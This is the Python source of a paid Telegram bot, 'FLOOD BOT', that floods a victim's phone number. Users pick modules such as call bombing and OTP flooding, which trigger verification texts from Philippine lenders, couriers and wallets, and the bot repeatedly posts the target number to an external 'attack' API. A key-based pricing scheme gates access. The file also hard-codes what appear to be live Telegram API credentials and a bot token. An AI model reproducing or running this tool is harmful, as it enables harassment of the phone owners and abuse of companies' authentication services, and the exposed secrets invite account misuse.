# language: Python, file: main.py, target: Telegram, Railway
# *Production-grade asynchronous Telegram bot with non-blocking HTTP requests, real-time progress updates, and robust error handling.*

import os
import time
import asyncio
import logging
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

API_ID = 31658480
API_HASH = "9becba7687e9d33c9e201dbcf1e13e52"
BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"

CHANNEL_INVITE = "https://t.me/yoszmi"
OWNER_CONTACT = "t.me/mtfeels"
API_URL = "https://beboy-sms.vercel.app/attack"

PRICING = {
    "7d": {"name": "7 Days Access", "price": "₱100", "days": 7},
    "1m": {"name": "1 Month Access", "price": "₱150", "days": 30},
    "life": {"name": "Lifetime Access", "price": "₱199", "days": 36500}
}

USER_DATABASE = {}
VALID_KEYS = {
    "KEY-7D-PH99": "7d",
    "KEY-1M-PH55": "1m",
    "KEY-LIFE-PH88": "life"
}

SERVICES_INFO = [
    ("CALL_BOMB",        "📞", "CALL BOMB      ", "Directly route automated voice calls to target phone number."),
    ("CALL_VOICE",       "☎️ ", "CALL VOICE     ", "Execute specialized automated voice channel flood."),
    ("OTP_FLOOD",        "📲", "OTP SERVICES   ", "Mass dispatch multi-gateway verification codes."),
    ("PAYLOAD_SVC",      "💥", "PAYLOAD SVC    ", "Advanced custom payload execution module."),
    ("CUSTOM_SMS",       "✉️ ", "CUSTOM SMS     ", "Send tailored custom text message payload directly."),
    ("EZLOAN",           "💳", "EZ LOAN        ", "Trigger verification text sequences from loan provider gateways."),
    ("XPRESS",           "⚡", "XPRESS         ", "Execute high-speed gateway verification bursts."),
    ("ABENSON",          "🏪", "ABENSON        ", "Dispatch retail authentication and notification triggers."),
    ("EXCELLENT_LENDING","💰", "EXCELLENT LEND ", "Initiate platform OTP authentication flows."),
    ("FORTUNE_PAY",      "🎰", "FORTUNE PAY    ", "Trigger wallet confirmation notification sequences."),
    ("WEMOVE",           "🚚", "WEMOVE         ", "Push logistics service tracking notifications."),
    ("LBC",              "📦", "LBC            ", "Dispatch courier verification alerts to target."),
    ("PICKUP_COFFEE",    "☕", "PICKUP COFFEE  ", "Send order confirmation and OTP strings."),
    ("HONEY_LOAN",       "🍯", "HONEY LOAN     ", "Simulate micro-lending verification pings."),
    ("KOMO_PH",          "🦅", "KOMO PH        ", "Trigger digital banking authentication codes."),
    ("S5_OTP",           "🔐", "S5 OTP         ", "Dispatch gaming platform multi-factor authentication packets.")
]

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

def get_user_record(user_id):
    if user_id not in USER_DATABASE:
        USER_DATABASE[user_id] = {
            "verified": False,
            "attempts_left": 3,
            "expiry": 0,
            "key_type": None,
            "target": "",
            "service": "CUSTOM_SMS"
        }
    return USER_DATABASE[user_id]

def check_access(user_id):
    record = get_user_record(user_id)
    if record["key_type"] and time.time() < record["expiry"]:
        return True, "🌟 ACTIVE VIP KEY"
    if record["attempts_left"] > 0:
        return True, f"🎁 FREE TRIAL ({record['attempts_left']}/3 LEFT)"
    return False, "❌ EXPIRED"

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 𝗦𝗘𝗟𝗘𝗖𝗧 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 & 𝗟𝗔𝗨𝗡𝗖𝗛", callback_data="menu_modules")],
        [InlineKeyboardButton("📊 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 & 𝗦𝗧𝗔𝗧𝗦", callback_data="menu_stats"),
         InlineKeyboardButton("💎 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 & 𝗣𝗟𝗔𝗡𝗦", callback_data="menu_pricing")],
        [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦 𝗞𝗘𝗬", url=f"https://{OWNER_CONTACT}"),
         InlineKeyboardButton("🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬", callback_data="menu_redeem")]
    ]
    return InlineKeyboardMarkup(keyboard)

def modules_menu_keyboard():
    keyboard = []
    for key, icon, label, _ in SERVICES_INFO:
        keyboard.append([InlineKeyboardButton(f"{icon} ⟡ {label.strip()}", callback_data=f"mod_{key}")])
    keyboard.append([InlineKeyboardButton("🔙 𝑹𝑬𝑻𝑼𝑹𝑵 𝑻𝑶 𝑴𝑨𝑰𝑵 𝑴𝑬𝑵𝑼", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    record = get_user_record(user_id)

    if not record["verified"]:
        keyboard = [
            [InlineKeyboardButton("🔗 𝑱𝑶𝑰𝑵 𝑶𝑭𝑭𝑰𝑪𝑰𝑨𝑳 𝑪𝑯𝑨𝑵𝑵𝑬𝑳", url=CHANNEL_INVITE)],
            [InlineKeyboardButton("✅ 𝑰 𝑯𝑨𝑽𝑬 𝑱𝑶𝑰𝑵𝑬𝑫 — 𝑽𝑬𝑹𝑰𝑭𝒀", callback_data="verify_join")]
        ]
        text = (
            "╔═══════════════════════════╗\n"
            "║   ✦ 𝐅𝐋𝐎𝐎𝐃 𝐁𝐎𝐓 • 𝐏𝐑𝐎 ✦   ║\n"
            "╚═══════════════════════════╝\n\n"
            "🔒 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃**\n\n"
            "To unlock and operate this terminal interface, join our official channel first:\n"
            f"🔗 {CHANNEL_INVITE}\n\n"
            "Once joined, tap verify below to claim your **3 free execution attempts**!"
        )
        if update.message:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        elif update.callback_query:
            await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    text = (
        "╔═══════════════════════════╗\n"
        "║   ✦ 𝐅𝐋𝐎𝐎𝐃 𝐁𝐎𝐓 • 𝐏𝐑𝐎 ✦   ║\n"
        "╚═══════════════════════════╝\n\n"
        f"👤 **Operator:** `{user.first_name}`\n"
        f"⚡ **Status:** `{check_access(user_id)[1]}`\n\n"
        "╭── 𝑴𝑨𝑰𝑵 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑳 𝑴𝑬𝑵𝑼 ──╮\n"
        "│ Select an operation below:\n"
        "╰───────────────────────────╯"
    )
    if update.message:
        await update.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    record = get_user_record(user_id)

    if data == "verify_join":
        record["verified"] = True
        record["attempts_left"] = max(3, record["attempts_left"])
        await query.message.edit_text(
            "✨ **𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋!** ✨\n\n"
            "You have unlocked **3 free execution attempts**.\n"
            "Accessing terminal dashboard...",
            reply_markup=main_menu_keyboard(),
            parse_mode="Markdown"
        )
        return

    if data == "main_menu":
        await start(update, context)
        return

    if data == "menu_modules":
        allowed, status_msg = check_access(user_id)
        if not allowed:
            await query.message.edit_text(
                "❌ **𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃**\nYour free trials and access key have expired. Please acquire a VIP key.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛒 𝐁𝐔𝐘 𝐀𝐂𝐂𝐄𝐒𝐒 𝐊𝐄𝐘", url=f"https://{OWNER_CONTACT}")],
                    [InlineKeyboardButton("🔙 𝑹𝑬𝑻𝑼𝑹𝑵", callback_data="main_menu")]
                ]),
                parse_mode="Markdown"
            )
            return
        await query.message.edit_text(
            f"⚡ **𝐒𝐄𝐋𝐄𝐂𝐓 𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 𝐌𝐎𝐃𝐔𝐋𝐄** ⚡\nStatus: `{status_msg}`\n\nChoose your payload module:",
            reply_markup=modules_menu_keyboard(),
            parse_mode="Markdown"
        )
        return

    if data.startswith("mod_"):
        service_key = data.replace("mod_", "")
        matched = next((s for s in SERVICES_INFO if s[0] == service_key), None)
        if matched:
            _, icon, label, tutorial = matched
            record["service"] = service_key
            text = (
                f"{icon} 𓆩 **𝐌𝐎𝐃𝐔𝐋𝐄: {label.strip().upper()}** 𓆪\n\n"
                f"📖 **𝑸𝒖𝒊𝒄𝒌 𝑻𝒖𝒕𝒐𝒓𝒊𝒂𝒍:**\n{tutorial}\n\n"
                f"💬 **𝑹𝒆𝒂𝒅𝒚 𝒇𝒐𝒓 𝑫𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕:**\n"
                f"Send target number in chat now (e.g. `09693457389` or format with batches like `09693457389 5`)."
            )
            keyboard = [[InlineKeyboardButton("🔙 𝑩𝒂𝒄𝒌 𝒕𝒐 𝑴𝒐𝒅𝒖𝒍𝒆𝒔", callback_data="menu_modules")]]
            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    if data == "menu_stats":
        allowed, status_msg = check_access(user_id)
        expiry_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(record["expiry"])) if record["expiry"] > 0 else "𝐍/𝐀"
        text = (
            "📊 **𝐓𝐑𝐀𝐂𝐊𝐄𝐑 & 𝐒𝐓𝐀𝐓𝐒 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃** 📊\n\n"
            f"👤 **User:** `{query.from_user.first_name}`\n"
            f"🛡️ **Plan Status:** `{status_msg}`\n"
            f"🔢 **Free Tries Left:** `{max(0, record['attempts_left'])}`\n"
            f"🔑 **Key Type:** `{record['key_type'] or 'Free Trial'}`\n"
            f"⏳ **Key Expiry:** `{expiry_str}`\n\n"
            f"💬 **Full Credits to:** `MTFEELS`"
        )
        keyboard = [[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    if data == "menu_pricing":
        text = (
            "💎 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐊𝐄𝐘 𝐏𝐑𝐈𝐂𝐈𝐍𝐆 & 𝐏𝐋𝐀𝐍𝐒** 💎\n\n"
            f"🌟 **7 Days Access:** `{PRICING['7d']['price']}`\n"
            f"🔥 **1 Month Access:** `{PRICING['1m']['price']}`\n"
            f"⚡ **Lifetime Access:** `{PRICING['life']['price']}`\n\n"
            f"🛒 **To Purchase:** Message owner directly at **@{OWNER_CONTACT}**"
        )
        keyboard = [
            [InlineKeyboardButton("🛒 𝑩𝒖𝒚 𝑲𝒆𝒚 𝑵𝒐𝒘", url=f"https://{OWNER_CONTACT}")],
            [InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]
        ]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    if data == "menu_redeem":
        text = "🔑 **𝐑𝐄𝐃𝐄𝐌𝐏𝐓𝐈𝐎𝐍 𝐏𝐎𝐑𝐓𝐀𝐋**\n\nSend your access key in chat using this format:\n`/redeem YOUR-KEY-HERE`"
        keyboard = [[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    record = get_user_record(user_id)
    args = context.args

    if not args:
        await update.message.reply_text("❌ Please provide your key. Example: `/redeem KEY-7D-PH99`", parse_mode="Markdown")
        return

    key = args[0].strip()
    if key in VALID_KEYS:
        k_type = VALID_KEYS[key]
        days = PRICING[k_type]["days"]
        record["key_type"] = k_type
        record["expiry"] = time.time() + (days * 86400)
        record["attempts_left"] = 999999
        await update.message.reply_text(f"✅ **𝐒𝐔𝐂𝐂𝐄𝐒𝐒!** Key redeemed for **{PRICING[k_type]['name']}**.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ **Invalid Key.** Contact **@{OWNER_CONTACT}** to acquire a valid key.", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    user_id = update.effective_user.id
    record = get_user_record(user_id)
    
    if not record["verified"]:
        await update.message.reply_text("❌ Please complete the channel verification first using `/start`.", parse_mode="Markdown")
        return

    text = update.message.text.strip()
    allowed, _ = check_access(user_id)
    if not allowed:
        await update.message.reply_text(f"❌ Access expired! Please acquire a VIP key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
        return

    parts = text.split()
    target_phone = parts[0]
    batches = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 3

    if not target_phone.isdigit() or len(target_phone) < 10:
        return

    if not (record["key_type"] and time.time() < record["expiry"]):
        if record["attempts_left"] > 0:
            record["attempts_left"] -= 1
        else:
            await update.message.reply_text(f"❌ Free trials exhausted! Acquire a VIP key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
            return

    service_key = record["service"]
    status_msg = await update.message.reply_text(f"🚀 **𝐈𝐍𝐈𝐓𝐈𝐀𝐋𝐈𝐙𝐈𝐍𝐆 𝐅𝐋𝐎𝐎𝐃**\nTarget: `{target_phone}`\nModule: `{service_key}`", parse_mode="Markdown")

    success_count = 0
    fail_count = 0

    async with httpx.AsyncClient(timeout=15.0) as client:
        for i in range(1, batches + 1):
            pct = int((i / batches) * 100)
            bar = "█" * int(20 * i / batches) + "░" * (20 - int(20 * i / batches))
            
            try:
                resp = await client.post(
                    API_URL,
                    data={"phone": target_phone, "amount": "1", "sender_name": "FLOOD BOT", "message": "Notification alert."},
                    files={"services": (None, service_key)},
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                if resp.status_code == 200:
                    success_count += 1
                else:
                    fail_count += 1
            except Exception:
                fail_count += 1

            try:
                await status_msg.edit_text(
                    f"⚡ **𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐍𝐆 𝐅𝐋𝐎𝐎𝐃 𝐏𝐑𝐎𝐂𝐄𝐒𝐒**\n"
                    f"Target: `{target_phone}`\n"
                    f"Progress: `[{bar}] {pct}%`\n"
                    f"Iteration: **{i}/{batches}**",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            await asyncio.sleep(0.5)

    await status_msg.edit_text(
        f"✅ **𝐃𝐄𝐏𝐋𝐎𝐘𝐌𝐄𝐍𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄**\n"
        f"Target: `{target_phone}`\n\n"
        f"🟢 Success: **{success_count}**\n"
        f"🔴 Failed: **{fail_count}**\n"
        f"📊 Total Batches: **{batches}**\n\n"
        f"✨ *Full credits to MTFEELS*",
        reply_markup=main_menu_keyboard(),
        parse_mode="Markdown"
    )

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("[+] FLOOD BOT aesthetic async interface online...")
    app.run_polling()

if __name__ == "__main__":
    main()
